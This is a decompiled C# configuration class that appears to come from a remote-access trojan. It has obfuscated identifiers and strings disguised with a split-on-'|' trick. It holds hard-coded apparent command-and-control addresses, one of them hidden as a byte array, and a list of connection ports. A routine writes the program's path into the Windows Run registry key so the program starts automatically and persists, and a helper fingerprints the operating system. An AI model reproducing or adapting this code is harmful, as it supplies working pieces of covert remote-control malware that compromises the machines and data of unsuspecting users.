using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace uiltghnsra;

internal static class COUNF
{
	public static string uiltghnsrapdc_ird = "ritiba|uiltghnsra".Split(new char[1] { '|' })[0];

	public static string uiltghnsraremvUdser = "ihcwrainkr|uiltghnsra".Split(new char[1] { '|' })[0];

	public static string uiltghnsrafilesLrougs = "thcdhsldh".Split(new char[1] { '|' })[0];

	public static string uiltghnsradefarultP = "210.180.230.250|uiltghnsra".Split(new char[1] { '|' })[0];

	public static string uiltghnsramainrAipp = "uiltghnsra|uiltghnsra".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 4898, 8786, 12561, 14886, 16668 };

	public static int uiltghnsrapodrt;

	public static byte[] uiltghnsravpsidps = new byte[14]
	{
		49, 57, 56, 46, 50, 51, 46, 50, 49, 48,
		46, 50, 49, 49
	};

	public static string filePatdh = Application.get_ExecutablePath();

	public static byte[] getuByteuAriray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string getBytsdString(byte[] data)
	{
		char[] array = new char[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			char c = (array[i] = Convert.ToChar(data[i]));
		}
		return new string(array);
	}

	public static string uiltghnsraOsndame()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!uiltghnsra".Split(new char[1] { '!' })[0];
		}
	}

	public static void uiltghnsraset_rudn(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|uiltghnsra".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			object value = registryKey.GetValue(uiltghnsrapdc_ird + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(uiltghnsrapdc_ird + app, path);
			}
		}
		catch
		{
		}
	}

	public static string uiltghnsraget_mpiath()
	{
		return Path.GetDirectoryName(filePatdh) + "\\";
	}
}
